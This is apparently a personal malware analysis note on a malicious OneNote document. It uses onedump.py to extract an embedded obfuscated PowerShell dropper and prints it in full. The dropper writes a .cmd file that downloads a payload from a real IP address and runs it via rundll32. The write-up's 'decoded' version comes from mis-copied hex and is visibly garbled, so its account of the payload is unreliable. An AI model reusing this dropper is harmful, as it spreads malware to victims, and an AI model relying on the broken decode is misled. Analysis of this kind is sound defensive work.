<h1>OneNote Documents</h1> are used lately to deliver malware payload like Quakbot, AsyncRat, AveMariaRat and more.

I will use [onedump.py](https://github.com/DidierStevens/Beta/blob/master/onedump.py) to dump the content of the .one files.

Sample 1 : 

[MalwareBazaar - Sample 1](https://bazaar.abuse.ch/download/ca9ed818a8decbefc8f9661b2e7995a9e1afb63a848a043963eec6ae54288a57/)



```bash
 C:\Users\fl-vm\Desktop\onenote malware
`onedump.py` ca9ed818a8decbefc8f9661b2e7995a9e1afb63a848a043963eec6ae54288a57.one
File: ca9ed818a8decbefc8f9661b2e7995a9e1afb63a848a043963eec6ae54288a57.one
1: 0x00002768 GIF8 47494638 0x0000a917 04274ab750afc06d5c7bda754bd4a289
2: 0x0001e1a0 GIF8 47494638 0x000016bb 42499ce6dd90e678a5366613dce62b96
3: 0x0001f890 .pow 0d706f77 0x0000058a 41772dc21ceaacf67da796ed864e86d2
4: 0x0001fe50 .PNG 89504e47 0x0000054a c2bf462c1311a92660999498f29394bd
```

We listed the contents of the .one file and we will continue to dump stream number 3 and redirect the output into a txt file.

```bash
C:\Users\fl-vm\Desktop\onenote malware
Î» onedump.py ca9ed818a8decbefc8f9661b2e7995a9e1afb63a848a043963eec6ae54288a57.one -s 3 -d  > dump.1.txt
```

dump.1.txt:

```powershell.exe $aU3Ysvf = '8eafcde359d51e3e5386f19516e4ea65'; $atxhi = '0d,0a,40,65,63,68,6f,20,6f,66,66,0d,0a,73,65,74,20,61,79,71,4b,45,3d,25,32,0d,0a,70,6f,77,65,72,73,68,65,6c,6c,20,28,6e,65,77,2d,6f,62,6a,65,63,74,20,73,79,73,74,65,6d,2e,6e,65,74,2e,77,65,62,63,6c,69,65,6e,74,29,2e,64,6f,77,6e,6c,6f,61,64,66,69,6c,65,28,27,68,74,74,70,3a,2f,2f,31,34,36,2e,35,39,2e,34,33,2e,31,35,39,2f,37,38,30,36,38,33,2e,64,61,74,27,2c,20,27,43,3a,5c,70,72,6f,67,72,61,6d,64,61,74,61,5c,61,45,6b,44,53,4c,35,2e,6a,70,67,27,29,3b,0d,0a,72,55,25,31,6c,6c,33,32,20,43,3a,5c,70,72,6f,67,72,61,6d,64,61,74,61,5c,61,45,6b,44,53,4c,35,2e,6a,70,67,2c,57,69,6e,64,0d,0a,70,6f,77,65,72,73,68,65,6c,6c,20,41,64,64,2d,54,79,70,65,20,2d,41,73,73,65,6d,62,6c,79,4e,61,6d,65,20,50,72,65,73,65,6e,74,61,74,69,6f,6e,43,6f,72,65,2c,50,72,65,73,65,6e,74,61,74,69,6f,6e,46,72,61,6d,65,77,6f,72,6b,3b,20,5b,53,79,73,74,65,6d,2e,57,69,6e,64,6f,77,73,2e,4d,65,73,73,61,67,65,42,6f,78,5d,3a,3a,53,68,6f,77,28,27,54,68,65,20,63,75,72,72,65,6e,74,20,73,65,6c,65,63,74,69,6f,6e,20,69,73,20,6e,6f,74,20,73,75,70,70,6f,72,74,65,64,2e,27,2c,20,27,44,61,74,61,20,52,65,61,64,20,45,72,72,6f,72,27,2c,20,27,4f,4b,27,2c,20,27,45,72,72,6f,72,27,29,3b,0d,0a,65,78,69,74,0d,0a' -split ',' ^| foreach {[char]([convert]::toint16($_,16))}; $aC2RZNKMc = $atxhi -join ''; $aC2RZNKMc > C:\Users\Public\akvzmVI.cmd&&start /min C:\Users\Public\akvzmVI.cmd nd hellobro)```

The code sets the value of two variables, `$aU3Ysvf`and `$atxhi`.The first variable is a hardcoded string of characters representing a MD5 hash. The second variable is a string of comma-separated values that represent the hexadecimal representation of ASCII characters.

Finally, the code writes the content of `$aC2RZNKMc` to a file named `akvzmVI.cmd`located in the `C:\Users\Public`directory, and executes it using the `start`command.


I extracted the hex values between the `''` and removed the virgules between the 2 digits characters using `Find&Replace from Notepad++`

![image](https://user-images.githubusercontent.com/36852270/218305800-4d79c4a2-d763-4826-a46d-69cb7f9c8563.png)

Value:

`0d 0a 40 65 63 68 6f 20 6f 66 66 0d 0a 73 65 74 20 61 79 71 4b 45 3d 25 32 0d 0a 70 6f 77 65 72 73 68 65 6c 6c 20 28 6e 65 77 2d 6f 62 6a 65 63 74 20 73 79 73 74 65 6d 2e 6e 65 74 2e 77 65 62 63 6c 69 65 28 27 68 74 74 70 3a 2f 2f 31 34 36 2e 35 39 2e 34 33 2e 31 35 39 2f 37 38 30 36 38 33 2e 64 61 27 2c 20 27 43 3a 5c 70 72 6f 67 72 61 64 64 61 74 61 73 70 6f 74 73 2e 63 6f 6d 5c 73 63 72 69 70 74 73 5c 64 6f 77 6e 6c 6f 61 64 66 69 6c 65 28 27 68 74 74 70 3a 2f 2f 31 34 36 2e 35 39 2e 34 33 2e 31 35 39 2f 37 38 30 36 38 33 2e 64 61 27 2c 20 27 2f 6f 20 27 2b 20 27 2f 63 20 27 2b 20 27 61 55 33 59 73 76 66 27 20 2b 20 27 2e 65 78 65 27 29 2e 65 78 65 63 28 29 2e 74 79 70 65 28 29 3b 0d 0a`

Decoded hex characters:

```powershell
@echo off
set ayqKE=%2
powershell (new-object system.net.webclie('http://146.59.43.159/780683.da', 'C:\prograddataspots.com\scripts\downloadfile('http://146.59.43.159/780683.da', '/o '+ '/c '+ 'aU3Ysvf' + '.exe').exec().type();
```

The code starts with a `bat` command to turn off `echo` and it execute a command using PowerShell to download a file from a remote server.

Unfortunately, that remote server is no longer online and I could not  find the 780683.da file on Malware Bazaar to continue my analysis.




Reference:

[https://www.youtube.com/watch?v=kK6Tsmr_wCY](https://www.youtube.com/watch?v=kK6Tsmr_wCY)

[Sans.edu analysis](https://isc.sans.edu/diary/A+First+Malicious+OneNote+Document/29470/)
